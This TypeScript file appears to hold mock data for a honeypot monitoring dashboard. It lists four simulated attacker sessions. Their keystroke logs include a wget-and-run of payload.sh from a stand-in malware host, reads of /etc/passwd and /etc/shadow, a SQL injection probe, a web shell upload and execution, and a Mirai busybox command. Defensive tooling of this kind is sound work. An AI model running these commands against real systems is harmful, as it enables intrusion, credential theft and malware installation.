import { HoneypotSession } from '@/types';

export const INITIAL_HONEYPOTS: HoneypotSession[] = [
  {
    id: 'HP-SSH-01',
    service: 'SSH',
    containerId: 'docker-trap-ssh-7f9a',
    attackerIp: '185.220.101.5',
    port: 2222,
    startTime: '2026-08-08 16:42:10',
    status: 'RUNNING',
    keystrokes: [
      'ssh root@192.168.10.45 -p 2222',
      'password: ********',
      'uname -a',
      'cat /etc/passwd',
      'wget http://malware-repo.bad/payload.sh',
      'chmod +x payload.sh',
      './payload.sh --stealth'
    ],
    commandsExecuted: [
      'uname -a',
      'cat /etc/passwd',
      'curl -s http://ipinfo.io',
      'wget http://malware-repo.bad/payload.sh'
    ],
    capturedPayloadsCount: 3,
    riskScore: 88
  },
  {
    id: 'HP-HTTP-02',
    service: 'HTTP',
    containerId: 'docker-trap-web-3c1b',
    attackerIp: '198.51.100.42',
    port: 8080,
    startTime: '2026-08-08 16:47:30',
    status: 'RUNNING',
    keystrokes: [
      'GET /admin/login.php?user=admin\'%20OR%201=1--',
      'POST /upload.php [Multipart Payload: shell.php]',
      'GET /uploads/shell.php?cmd=id'
    ],
    commandsExecuted: [
      'SQL injection probe into /admin/login.php',
      'Unrestricted file upload attempt shell.php',
      'Execution request /uploads/shell.php?cmd=id'
    ],
    capturedPayloadsCount: 5,
    riskScore: 92
  },
  {
    id: 'HP-TELNET-03',
    service: 'TELNET',
    containerId: 'docker-trap-iot-8e4d',
    attackerIp: '203.0.113.195',
    port: 2323,
    startTime: '2026-08-08 16:50:04',
    status: 'RUNNING',
    keystrokes: [
      'login: admin',
      'password: admin',
      'enable',
      'system',
      'shell',
      '/bin/busybox MIRAI'
    ],
    commandsExecuted: [
      'admin / admin default cred test',
      '/bin/busybox MIRAI execution attempt'
    ],
    capturedPayloadsCount: 1,
    riskScore: 74
  },
  {
    id: 'HP-FTP-04',
    service: 'FTP',
    containerId: 'docker-trap-ftp-11a9',
    attackerIp: '103.251.140.2',
    port: 2121,
    startTime: '2026-08-08 16:30:00',
    status: 'ISOLATED',
    keystrokes: [
      'USER anonymous',
      'PASS guest@',
      'CWD ../../etc',
      'RETR shadow'
    ],
    commandsExecuted: [
      'Directory traversal attempt ../../etc/shadow'
    ],
    capturedPayloadsCount: 0,
    riskScore: 40
  }
];
